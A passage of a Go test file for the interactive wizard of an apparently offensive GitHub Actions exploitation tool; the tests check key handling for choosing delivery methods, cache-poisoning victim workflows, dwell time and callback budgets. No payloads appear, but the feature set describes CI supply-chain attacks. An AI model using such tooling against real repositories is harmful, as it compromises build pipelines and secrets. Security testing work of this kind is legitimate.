			CachePoisonVictims: []cachepoison.VictimCandidate{{Workflow: ".github/workflows/deploy.yml", Ready: true}},
		},
		DeliveryMethod: DeliveryComment,
	}
	m.wizardInput.Focus()
	m.wizardInput.SetValue("31")

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'c'})

	model := result.(Model)
	assert.True(t, model.wizard.CachePoisonEnabled)
	assert.Equal(t, "31", model.wizardInput.Value())
}

func TestWizardKeyMsg_CommentIssueNumberStillCyclesCachePoisonVictims(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:        "acme/api",
			Context:           "issue_comment",
			CachePoisonWriter: true,
			CachePoisonVictims: []cachepoison.VictimCandidate{
				{Workflow: ".github/workflows/build.yml", Ready: true},
				{Workflow: ".github/workflows/deploy.yml", Ready: true},
			},
		},
		DeliveryMethod:         DeliveryComment,
		CachePoisonEnabled:     true,
		CachePoisonVictimIndex: 0,
	}
	m.wizardInput.Focus()
	m.wizardInput.SetValue("31")

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'v'})

	model := result.(Model)
	assert.Equal(t, 1, model.wizard.CachePoisonVictimIndex)
	assert.Equal(t, "31", model.wizardInput.Value())
}

func TestWizardKeyMsg_CommentIssueNumberStillTogglesCacheReplacement(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghs_app_token", Type: TokenTypeInstallApp}
	m.appTokenPermissions = map[string]string{"actions": "write"}
	m.wizard = &WizardState{
		Step: 3,
		SelectedVuln: &Vulnerability{
			Repository:         "acme/api",
			Context:            "issue_comment",
			CachePoisonWriter:  true,
			CachePoisonVictims: []cachepoison.VictimCandidate{{Workflow: ".github/workflows/deploy.yml", Ready: true}},
		},
		DeliveryMethod:     DeliveryComment,
		CachePoisonEnabled: true,
	}
	m.wizardInput.Focus()
	m.wizardInput.SetValue("31")

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'r'})

	model := result.(Model)
	assert.True(t, model.wizard.CachePoisonReplace)
	assert.Equal(t, "31", model.wizardInput.Value())
}

func TestWizardKeyMsg_CommentCyclesTargetModes(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:           3,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "issue_comment"},
		DeliveryMethod: DeliveryComment,
		CommentTarget:  CommentTargetIssue,
	}
	m.wizardInput.Focus()

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 't'})
	model := result.(Model)
	assert.Equal(t, CommentTargetPullRequest, model.wizard.CommentTarget)
	assert.True(t, model.wizardInput.Focused())

	result, _ = model.handleWizardKeyMsg(tea.KeyPressMsg{Code: 't'})
	model = result.(Model)
	assert.Equal(t, CommentTargetStubPullRequest, model.wizard.CommentTarget)
	assert.False(t, model.wizardInput.Focused())
}

func TestWizardKeyMsg_CommentStubPRIgnoresNumericInputAndTogglesAutoClose(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:           3,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "issue_comment"},
		DeliveryMethod: DeliveryComment,
		CommentTarget:  CommentTargetStubPullRequest,
	}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Text: "7", Code: '7'})
	model := result.(Model)
	assert.Equal(t, "", model.wizardInput.Value())

	result, _ = model.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'a'})
	model = result.(Model)
	require.NotNil(t, model.wizard.AutoClose)
	assert.False(t, *model.wizard.AutoClose)
}

func TestAdvanceWizardStep_NilWizard(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.wizard = nil

	result, cmd := m.advanceWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Nil(t, model.wizard)
}

func TestAdvanceWizardStep_Step1To2(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:         1,
		SelectedVuln: &Vulnerability{Repository: "acme/api", Context: "pr_body"},
	}

	result, cmd := m.advanceWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 2, model.wizard.Step)
}

func TestAdvanceWizardStep_Step2To3(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "pr_body"},
		DeliveryMethod: DeliveryAutoPR,
	}

	result, cmd := m.advanceWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 3, model.wizard.Step)
}

func TestAdvanceWizardStep_Step2To3_CommentFocusesInput(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   &Vulnerability{Repository: "acme/api", Context: "issue_comment"},
		DeliveryMethod: DeliveryComment,
	}

	result, cmd := m.advanceWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 3, model.wizard.Step)
	assert.True(t, model.wizardInput.Focused(), "wizardInput should be focused for comment delivery")
}

func TestAdvanceWizardStep_Step3_DelegatesToDeployment(t *testing.T) {
	mock := &mockKitchenClient{}
	m := newModelForWizardDeploy(t, mock)
	m.tokenInfo = nil
	m.wizard.SelectedVuln = &Vulnerability{Repository: "acme/api", ID: "V001"}
	m.wizard.DeliveryMethod = DeliveryAutoPR
	m.wizard.Step = 3

	result, cmd := m.advanceWizardStep()

	model := result.(Model)
	assert.Nil(t, cmd)
	require.NotEmpty(t, model.output)
	assert.Contains(t, model.output[len(model.output)-1].Content, "GitHub token not set")
}

func TestWizardKeyMsg_NilWizard(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = nil

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyEnter})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.NotEqual(t, PhaseWizard, model.phase, "Should exit wizard when wizard is nil")
}

func TestWizardKeyMsg_CtrlC_Quits(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 1}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})

	model := result.(Model)
	assert.True(t, model.quitting)
	assert.NotNil(t, cmd)
}

func TestWizardKeyMsg_Esc_Step1_ClosesWizard(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 1}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyEscape})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 1, model.wizard.Step, "Wizard should be reset (step back to 1)")
}

func TestWizardKeyMsg_Esc_Step2_GoesBack(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 2}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyEscape})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 1, model.wizard.Step)
}

func TestWizardKeyMsg_Esc_Step3_GoesBackToStep2(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyEscape})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 2, model.wizard.Step)
}

func TestWizardKeyMsg_Enter_AdvancesStep(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{
		Step:         1,
		SelectedVuln: &Vulnerability{Repository: "acme/api"},
	}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyEnter})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, 2, model.wizard.Step)
}

func TestWizardKeyMsg_NumberKey_SelectsDelivery(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	vuln := &Vulnerability{Repository: "acme/api", Context: "pr_body", Trigger: "pull_request"}
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   vuln,
		DeliveryMethod: DeliveryAutoPR,
	}

	methods := ApplicableDeliveryMethods(vuln)
	require.True(t, len(methods) >= 2, "Should have at least 2 delivery methods")

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: '2'})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, methods[1], model.wizard.DeliveryMethod, "Should select second delivery method")
}

func TestWizardKeyMsg_NumberKey_IgnoresBlockedDelivery(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	vuln := &Vulnerability{
		Repository: "acme/api",
		Workflow:   ".github/workflows/pr.yml",
		RuleID:     "untrusted_checkout_exec",
		LOTPAction: "actions/setup-go",
	}
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   vuln,
		DeliveryMethod: DeliveryManualSteps,
	}

	result, cmd := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: '1'})

	model := result.(Model)
	assert.Nil(t, cmd)
	assert.Equal(t, DeliveryManualSteps, model.wizard.DeliveryMethod)
}

func TestWizardKeyMsg_DownKey_NavigatesDelivery(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	vuln := &Vulnerability{Repository: "acme/api", Context: "pr_body", Trigger: "pull_request"}
	methods := ApplicableDeliveryMethods(vuln)
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   vuln,
		DeliveryMethod: methods[0],
	}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyDown})

	model := result.(Model)
	assert.Equal(t, methods[1], model.wizard.DeliveryMethod)
}

func TestWizardKeyMsg_UpKey_NavigatesDelivery(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	vuln := &Vulnerability{Repository: "acme/api", Context: "pr_body", Trigger: "pull_request"}
	methods := ApplicableDeliveryMethods(vuln)
	require.True(t, len(methods) >= 2)
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   vuln,
		DeliveryMethod: methods[1],
	}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyUp})

	model := result.(Model)
	assert.Equal(t, methods[0], model.wizard.DeliveryMethod)
}

func TestWizardKeyMsg_UpKey_AtTop_StaysAtTop(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT, Scopes: []string{"repo"}}
	vuln := &Vulnerability{Repository: "acme/api", Context: "pr_body", Trigger: "pull_request"}
	methods := ApplicableDeliveryMethods(vuln)
	m.wizard = &WizardState{
		Step:           2,
		SelectedVuln:   vuln,
		DeliveryMethod: methods[0],
	}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: tea.KeyUp})

	model := result.(Model)
	assert.Equal(t, methods[0], model.wizard.DeliveryMethod, "Should stay at first method")
}

func TestWizardKeyMsg_DKey_TogglesDwellTime(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DwellTime: 0}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'd'})

	model := result.(Model)
	assert.Equal(t, 30*time.Second, model.wizard.DwellTime, "First toggle should go to 30s")
}

func TestWizardKeyMsg_DKey_CyclesDwellPresets(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DwellTime: 5 * time.Minute}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'd'})

	model := result.(Model)
	assert.Equal(t, time.Duration(0), model.wizard.DwellTime, "Should cycle back to 0 after 5m")
}

func TestWizardKeyMsg_DKey_IgnoredOnStep2(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 2, DwellTime: 0}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'd'})

	model := result.(Model)
	assert.Equal(t, time.Duration(0), model.wizard.DwellTime, "d key should be ignored on step 2")
}

func TestWizardKeyMsg_BKey_TogglesCallbackBudget(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, CallbackBudget: 1}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'b'})

	model := result.(Model)
	assert.Equal(t, 2, model.wizard.CallbackBudget)
}

func TestWizardKeyMsg_BKey_CyclesCallbackBudgetPresets(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, CallbackBudget: 5}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'b'})

	model := result.(Model)
	assert.Equal(t, 1, model.wizard.CallbackBudget)
}

func TestWizardKeyMsg_BKey_WorksForCommentDelivery(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryComment, CallbackBudget: 1}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'b'})

	model := result.(Model)
	assert.Equal(t, 2, model.wizard.CallbackBudget)
}

func TestWizardKeyMsg_BKey_IgnoredForCachePoison(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, CallbackBudget: 1, CachePoisonEnabled: true}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'b'})

	model := result.(Model)
	assert.Equal(t, 1, model.wizard.CallbackBudget)
}

func TestWizardKeyMsg_FKey_TogglesDraft(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryAutoPR}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'f'})
	model := result.(Model)
	require.NotNil(t, model.wizard.Draft)
	assert.False(t, *model.wizard.Draft, "First press should set Draft to false (was nil=default true)")

	result, _ = model.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'f'})
	model = result.(Model)
	require.NotNil(t, model.wizard.Draft)
	assert.True(t, *model.wizard.Draft, "Second press should toggle Draft back to true")
}

func TestWizardKeyMsg_FKey_IgnoredForIssue(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryIssue}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'f'})
	model := result.(Model)
	assert.Nil(t, model.wizard.Draft, "f key should be ignored for Issue delivery")
}

func TestWizardKeyMsg_AKey_TogglesAutoClose(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryAutoPR}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'a'})
	model := result.(Model)
	require.NotNil(t, model.wizard.AutoClose)
	assert.False(t, *model.wizard.AutoClose, "First press should set AutoClose to false (was nil=default true)")

	result, _ = model.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'a'})
	model = result.(Model)
	require.NotNil(t, model.wizard.AutoClose)
	assert.True(t, *model.wizard.AutoClose, "Second press should toggle AutoClose back to true")
}

func TestWizardKeyMsg_AKey_WorksForIssue(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryIssue}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'a'})
	model := result.(Model)
	require.NotNil(t, model.wizard.AutoClose, "a key should work for Issue delivery")
	assert.False(t, *model.wizard.AutoClose)
}

func TestWizardKeyMsg_AKey_IgnoredForComment(t *testing.T) {
	m := NewModel(Config{SessionID: "test"})
	m.phase = PhaseWizard
	m.wizard = &WizardState{Step: 3, DeliveryMethod: DeliveryComment}

	result, _ := m.handleWizardKeyMsg(tea.KeyPressMsg{Code: 'a'})
	model := result.(Model)
	assert.Nil(t, model.wizard.AutoClose, "a key should be ignored for Comment delivery")
}
